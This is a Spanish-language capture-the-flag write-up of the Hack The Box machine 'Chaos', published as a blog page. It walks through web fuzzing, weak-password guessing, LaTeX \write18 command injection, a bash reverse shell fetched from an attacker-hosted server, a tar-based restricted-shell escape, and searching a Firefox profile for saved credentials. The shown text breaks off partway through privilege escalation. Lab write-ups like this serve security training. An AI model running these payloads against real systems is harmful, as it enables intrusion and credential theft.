@@ -1,0 +1,905 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Chaos HTB Write-up - grafis Blog</title>
+<meta name="description" content="En este artículo comparto el write up de la máquina Chaos de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="grafis Blog">
+<meta property="og:title" content="Chaos HTB Write-up">
+<meta property="og:url" content="http://localhost:4000/Chaos/">
+
+
+  <meta property="og:description" content="En este artículo comparto el write up de la máquina Chaos de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/imagenes/Chaos/chaos_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-02-17T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/Chaos/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "grafis",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="grafis Blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Chaos HTB Write-up</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="grafis" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">grafis</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Estudiante de Ingeniería Civil en Informática y Telecomunicaciones
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/mirko-babic-velásquez-4979bb219" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/grafis0" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Chaos HTB Write-up">
+    <meta itemprop="description" content="En este artículo comparto el write up de la máquina Chaos de Hack The Box">
+    <meta itemprop="datePublished" content="February 17, 2023">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Chaos HTB Write-up
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-02-17T00:00:00-05:00">February 17, 2023 </time>&emsp;
+          
+          
+        </p>
+        <p align="center">
+<img src="/imagenes/Chaos/Chaos_banner.png" width="550" height="250" />
+</p>
+
+<h1 id="resumen"><a href="#header-2"></a>Resumen</h1>
+
+<p>Saludos, en esta oportunidad vamos a resolver la máquina de <strong>Hack The Box</strong> llamada <strong>Chaos</strong>, la cual tiene una dificultad media. Para lograr vulnerarla realizaremos lo siguiente:</p>
+
+<ul>
+  <li>Fuzzing de directorios web.</li>
+  <li>Adivinar credenciales demasiado débiles.</li>
+  <li>Utilización de claws-mail (abusando de email).</li>
+  <li>Decrypt de un mensaje.</li>
+  <li>Restricted bash bypass.</li>
+  <li>Extracción de credenciales de una sesión de navegador.</li>
+</ul>
+
+<h2 id="reconocimiento-y-enumeración"><a href="#header-2"></a>Reconocimiento y Enumeración</h2>
+
+<p>En primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando <code class="language-plaintext highlighter-rouge">ping</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.120
+
+PING 10.10.10.120 (10.10.10.120) 56(84) bytes of data.
+64 bytes from 10.10.10.120: icmp_seq=1 ttl=63 time=144 ms
+</code></pre></div></div>
+<p>Se observa que existe una correcta conexión con la máquina.</p>
+
+<p>Para realizar un reconocimiento activo se utilizará la herramienta <code class="language-plaintext highlighter-rouge">nmap</code>, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro <code class="language-plaintext highlighter-rouge">-sS</code> el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- -sS --open -min-rate 5000 10.10.10.120 -oG Port
+</code></pre></div></div>
+<p>Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE
+80/tcp    open  http
+110/tcp   open  pop3
+143/tcp   open  imap
+993/tcp   open  imaps
+995/tcp   open  pop3s
+10000/tcp open  snet-sensor-mgmt
+</code></pre></div></div>
+<p>Realizamos un escaneo de los servicios expuestos utilizando <code class="language-plaintext highlighter-rouge">nmap</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sCV -p80,110,143,993,995,10000 10.10.10.120 -oN ServiceScan
+</code></pre></div></div>
+
+<p>Como resultado del escaneo tenemos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE  VERSION
+80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
+|_http-server-header: Apache/2.4.34 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+110/tcp   open  pop3     Dovecot pop3d
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_pop3-capabilities: STLS PIPELINING SASL TOP UIDL AUTH-RESP-CODE RESP-CODES CAPA
+143/tcp   open  imap     Dovecot imapd (Ubuntu)
+|_imap-capabilities: IMAP4rev1 more OK LITERAL+ have IDLE LOGIN-REFERRALS SASL-IR listed capabilities Pre-login LOGINDISABLEDA0001 post-login ID ENABLE STARTTLS
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
+|_imap-capabilities: IMAP4rev1 OK LITERAL+ more IDLE LOGIN-REFERRALS have AUTH=PLAINA0001 capabilities listed ENABLE post-login ID SASL-IR Pre-login
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+995/tcp   open  ssl/pop3 Dovecot pop3d
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_pop3-capabilities: USER PIPELINING SASL(PLAIN) TOP UIDL AUTH-RESP-CODE RESP-CODES CAPA
+10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>Observamos un montón de protocolos de email que los veremos después, vemos el puerto 80 con un servicio <strong>http</strong>, por lo tanto, vamos a usar <code class="language-plaintext highlighter-rouge">whatweb</code> para enumerar información:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.10.120
+http://10.10.10.120 [200 OK] Apache[2.4.34], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.34 (Ubuntu)], IP[10.10.10.120]
+</code></pre></div></div>
+
+<p>No vemos casi nada, vamos a revisar la web:</p>
+
+<p><img src="/imagenes/Chaos/chaos1.png" alt="" /></p>
+
+<p>Observamos que no hay nada, sin embargo, leyendo lo que dice quizás se está aplicando virtual hosting y tenemos que entrar por un dominio, para ello tenemos que encontrar como se llama.</p>
+
+<p>Si nos fijamos en la captura de nmap:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+</code></pre></div></div>
+
+<p>Vemos el dominio chaos, por convenio normalmente siempre terminan en .htb así que vamos a introducir todo eso en el /etc/hosts:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+10.10.10.120    chaos.htb
+</code></pre></div></div>
+
+<p>Con esto listo, vamos a ver la web:</p>
+
+<p><img src="/imagenes/Chaos/chaos2.png" alt="" /></p>
+
+<p>Ahora si, por lo tanto, se estaba aplicando virutal hosting.</p>
+
+<p>Si inspeccionamos la web no encontramos nada de utilidad, por mientras vamos a fuzzear directorios utilizando <code class="language-plaintext highlighter-rouge">wfuzz</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 http://chaos.htb/FUZZ
+</code></pre></div></div>
+
+<p>Vamos a investigar el otro puerto http:</p>
+
+<p><img src="/imagenes/Chaos/chaos3.png" alt="" /></p>
+
+<p>Vamos a ingresar donde nos dicen:</p>
+
+<p><img src="/imagenes/Chaos/chaos4.png" alt="" /></p>
+
+<p>Encontramos un panel de webmin, sin embargo, no podemos hacer mucho (podría pensarse en shelllock porque es .cgi pero no es el caso).</p>
+
+<p>Si volvemos al fuzzing, no encontramos nada de interés.</p>
+
+<p>Pero como se está aplicando virtual hosting vamos a fuzzear por la dirección ip:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 http://10.10.10.120/FUZZ
+</code></pre></div></div>
+
+<p>Encontramos algo:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000000793:   301        9 L      28 W       309 Ch      "wp" 
+</code></pre></div></div>
+
+<p>Podría tratarse de una de las direcciones de <strong>WordPress</strong>, vamos a verlo:</p>
+
+<p><img src="/imagenes/Chaos/chaos5.png" alt="" /></p>
+
+<p>Encontramos una página con directory listing, si hacemos click en wordpress nos redirige hacia otra página:</p>
+
+<p><img src="/imagenes/Chaos/chaos6.png" alt="" /></p>
+
+<h2 id="explotación"><a href="#header-2"></a>Explotación</h2>
+
+<p>Vemos una sección donde pide contraseña, vamos a poner las típicas como password, pass, pero no hay resultado, si hacemos click en el post:</p>
+
+<p><img src="/imagenes/Chaos/chaos7.png" alt="" /></p>
+
+<p>Vemos el nombre del autor del post <strong>human</strong>, como último intento manual utilizaremos <strong>human</strong>:</p>
+
+<p><img src="/imagenes/Chaos/chaos8.png" alt="" /></p>
+
+<p>Vemos que esa era la contraseña, nos da unas credenciales de webmail, vamos a probarlas, para ello haremos uso de claws-mail para intentar conectados por imap:</p>
+
+<p><img src="/imagenes/Chaos/chaos9.png" alt="" /></p>
+
+<p>Ingresamos la información que tenemos y entramos:</p>
+
+<p><img src="/imagenes/Chaos/chaos10.png" alt="" /></p>
+
+<p>Vemos que tenemos varias carpetas, vamos a ir entrando una por una:</p>
+
+<p><img src="/imagenes/Chaos/chaos11.png" alt="" /></p>
+
+<p>Encontramos un mail donde envía un archivo encriptado y el código con el que lo enviaron. Vamos a revisarlo:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
+    <span class="n">chunksize</span> <span class="o">=</span> <span class="mi">64</span><span class="o">*</span><span class="mi">1024</span>
+    <span class="n">outputFile</span> <span class="o">=</span> <span class="s">"en"</span> <span class="o">+</span> <span class="n">filename</span>
+    <span class="n">filesize</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">getsize</span><span class="p">(</span><span class="n">filename</span><span class="p">)).</span><span class="n">zfill</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+    <span class="n">IV</span> <span class="o">=</span><span class="n">Random</span><span class="p">.</span><span class="n">new</span><span class="p">().</span><span class="n">read</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+
+    <span class="n">encryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">IV</span><span class="p">)</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">infile</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">outputFile</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">outfile</span><span class="p">:</span>
+            <span class="n">outfile</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">filesize</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
+            <span class="n">outfile</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">IV</span><span class="p">)</span>
+
+            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+                <span class="n">chunk</span> <span class="o">=</span> <span class="n">infile</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">chunksize</span><span class="p">)</span>
+
+                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                    <span class="k">break</span>
+                <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+                    <span class="n">chunk</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">' '</span> <span class="o">*</span> <span class="p">(</span><span class="mi">16</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span><span class="p">))</span>
+
+                <span class="n">outfile</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">encryptor</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">chunk</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">getKey</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
+            <span class="n">hasher</span> <span class="o">=</span> <span class="n">SHA256</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">password</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
+            <span class="k">return</span> <span class="n">hasher</span><span class="p">.</span><span class="n">digest</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Sin embargo, no buscaremos la forma de crear el decrypt, vamos a buscarlo por internet, encontramos este <a href="https://github.com/vj0shii/File-Encryption-Script">github</a> que salió con nuestra búsqueda, la cual fue copypaste del código.</p>
+
+<p>Vamos a utilizar el decrypt.py:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python decrypt.py
+Enter filename: enim_msg.txt
+Enter password: sahay
+</code></pre></div></div>
+
+<p>Esto nos crea un archivo:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat im_msg.txt
+SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK
+</code></pre></div></div>
+
+<p>Que es en base64, asi que lo vamos a decodear:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>base64 -d im_msg.txt
+Hii Sahay
+
+Please check our new service which create pdf
+
+p.s - As you told me to encrypt important msg, i did :)
+
+http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3
+
+Thanks,
+Ayush
+</code></pre></div></div>
+
+<p>Vemos que al parecer hay un servicio para crear pdf y nos dan el directorio, vamos a verlo:</p>
+
+<p><img src="/imagenes/Chaos/chaos12.png" alt="" /></p>
+
+<p>Si hacemos pruebas no vemos nada, vamos a intentar fuzzear este directorio por si encontramos alguna parte donde se puedan ver los pdf creados:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/FUZZ
+</code></pre></div></div>
+
+<p>Encontramos varios:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000000222:   301        9 L      28 W       331 Ch      "doc"
+00000013:   200        54 L     147 W      2656 Ch     "#"                                                                                                                                               
+000000651:   301        9 L      28 W       334 Ch      "source"                                                                                                                                          
+000000081:   301        9 L      28 W       337 Ch      "templates"                                                                                                                                       
+000000143:   301        9 L      28 W       331 Ch      "pdf"                                                                                                                                             
+000014361:   301        9 L      28 W       331 Ch      "tex
+</code></pre></div></div>
+
+<p>Hay uno llamado doc, si nos metemos:</p>
+
+<p><img src="/imagenes/Chaos/chaos13.png" alt="" /></p>
+
+<p>Encontramos cosas de Latex, será que hacen los documentos con ello?</p>
+
+<p>Vamos al más interesante que se llama pdf:</p>
+
+<p><img src="/imagenes/Chaos/chaos14.png" alt="" /></p>
+
+<p>Encontramos un montón de pdf, acá debe ser donde se almacenan, vamos a crear un pdf con la palabra hola y buscaremos si está aquí:</p>
+
+<p><img src="/imagenes/Chaos/chaos15.png" alt="" /></p>
+
+<p>Efectivamente, se encuentra el pdf, vamos a analizar la petición por <code class="language-plaintext highlighter-rouge">burpsuite</code>:</p>
+
+<p><img src="/imagenes/Chaos/chaos16.png" alt="" /></p>
+
+<p>Vemos que si están empleando latex para crear los documentos, vamos a buscar formas de aprovecharnos de eso.</p>
+
+<p><img src="/imagenes/Chaos/chaos17.png" alt="" /></p>
+
+<p>Vemos que hay una forma de ejecutar comandos, vamos a utilizar este:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\immediate\write18{id}
+</code></pre></div></div>
+
+<p><img src="/imagenes/Chaos/chaos18.png" alt="" /></p>
+
+<p>Observamos que tenemos ejecución remota de comandos, vamos entonces a ganar acceso al sistema.</p>
+
+<p>Esto lo realizaremos como siempre, compartiendo un index.html malicioso por un servidor http con python, haremos que la máquina víctima intente acceder a ese recurso y lo pipee con bash, mientras escuchamos conexión por netcat:</p>
+
+<p>index.html:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/10.10.14.17/1234 0&gt;&amp;1
+</code></pre></div></div>
+
+<p>Vamos a mandar el comando:</p>
+
+<p><img src="/imagenes/Chaos/chaos19.png" alt="" /></p>
+
+<p>En nuestro servidor en python:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.120 - - [17/Feb/2023 16:26:33] "GET / HTTP/1.1" 200 -
+</code></pre></div></div>
+
+<p>Y en el netcat:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.10.10.120] 59318
+bash: cannot set terminal process group (1069): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ 
+</code></pre></div></div>
+<p>Tenemos acceso al sistema.</p>
+
+<p>Pero no tenemos acceso a las carpetas, pero recordamos que tenemos una credencial de ayush, vamos a ver si la han reutilizado:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@chaos:/home$ su ayush
+Password: 
+ayush@chaos:/home$ 
+</code></pre></div></div>
+
+<p>Vamos a ver la flag:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
+ayush@chaos:/home$ 
+</code></pre></div></div>
+
+<p>Sin embargo, no podemos debido a que tenemos la bash restringida, si hacemos doble tab:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ayush@chaos:/home$ 
+!                         break                     coproc                    esac                      getopts                   mapfile                   set                       true
+./                        builtin                   declare                   eval                      hash                      ping                      shift                     type
+:                         caller                    dir                       exec                      help                      popd                      shopt                     typeset
+[                         case                      dirs                      exit                      history                   printf                    source                    ulimit
+[[                        cd                        disown                    export                    if                        pushd                     suspend                   umask
+]]                        command                   do                        false                     in                        pwd                       tar                       unalias
+{                         command_not_found_handle  done                      fc                        jobs                      read                      test                      unset
+}                         compgen                   echo                      fg                        kill                      readarray                 then                      until
+alias                     complete                  elif                      fi                        let                       readonly                  time                      wait
+bg                        compopt                   else                      for                       local                     return                    times                     while
+</code></pre></div></div>
+
+<p>Vemos todos los que podemos utilizar, hay uno en especial que es bastante interesante, corresponde al tar, pues si buscamos en la página web de <a href="https://gtfobins.github.io/">GTFobins</a> encontramos con que tar permite dar una shell, en este caso los permitiría saltarnos la rbash:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ayush@chaos:/home$ tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+tar: Removing leading `/' from member names
+bash: groups: command not found
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Si intentamos realizar un comando:
+
+ayush@chaos:/home$ ls
+Command 'ls' is available in '/bin/ls'
+The command could not be located because '/bin' is not included in the PATH environment variable.
+</code></pre></div></div>
+
+<p>Vemos que ya no tenemos resticción, sin embargo, faltan rutas en el path, por lo tanto, vamos a cambiar eso:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ayush@chaos:/home$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
+</code></pre></div></div>
+
+<p>Utilizamos la variable path de nuestro equipo.</p>
+
+<p>Ahora intentamos realizar comando:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ayush@chaos:/home$ cd ayush/
+ayush@chaos:~$ ls -la
+total 40
+drwx------ 6 ayush ayush 4096 Feb 17 20:43 .
+drwxr-xr-x 4 root  root  4096 Jun 30  2022 ..
+drwxr-xr-x 2 root  root  4096 Jun 30  2022 .app
+lrwxrwxrwx 1 root  root     9 Jul 12  2022 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 ayush ayush  220 Oct 28  2018 .bash_logout
+-rwxr-xr-x 1 root  root    22 Oct 28  2018 .bashrc
+drwx------ 3 ayush ayush 4096 Feb 17 20:43 .gnupg
+drwx------ 3 ayush ayush 4096 Feb 17 20:47 mail
+drwx------ 4 ayush ayush 4096 Jun 30  2022 .mozilla
+-rw-r--r-- 1 ayush ayush  807 Oct 28  2018 .profile
+-rw------- 1 ayush ayush   33 Feb 17 18:41 user.txt
+</code></pre></div></div>
+
+<p>Vemos que ya podemos realizar todo con comodidad y nos hemos saltado le rbash.</p>
+
+<p>Vemos algo interesante, el .mozilla, pero ahora vamos a ver la flag de usuario:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ayush@chaos:~$ cat user.txt
+eeca3d989309ee3028a35
+</code></pre></div></div>
+<p>¡Bien! tenemos la flag, ahora tenemos que escalar privilegios.</p>
+
+<h2 id="escalada-de-privilegios"><a href="#header-2"></a>Escalada de privilegios</h2>
+
+<p>Vimos un directorio firefox, antes de realizar otra cosa vamos a revisarlo, pues podrían existir cosas interesantes:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ayush@chaos:~/.mozilla/firefox$ ls
+ bzo7sjt1.default  'Crash Reports'   profiles.ini
+</code></pre></div></div>
+
+<p>Vemos que hay una sesión, podría existir información que nos interese.</p>
+
+<p>Si filtramos por ejemplo por password:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ayush@chaos:~/.mozilla/firefox/bzo7sjt1.default$ grep -r -i password 2&gt;/dev/null
+Binary file webappsstore.sqlite matches
+logins.json:{"nextId":3,"logins":[{"id":2,"hostname":"https://chaos.htb:10000","httpRealm":null,"formSubmitURL":"https://chaos.htb:10000","usernameField":"user","passwordField":"pass","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDSAazrlUMZFBAhbsMDAlL9iaw==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNx7bW1TuuCuBBAP8YwnxCZH0+pLo6cJJxnb","guid":"{cb6cd202-0ff8-4de5-85df-e0b8a0f18778}","encType":1,"timeCreated":1540642202692,"timeLastUsed":1540642202692,"timePasswordChanged":1540642202692,"timesUsed":1}],"disabledHosts":[],"version":2}
+Binary file key4.db matches
+</code></pre></div></div>
+
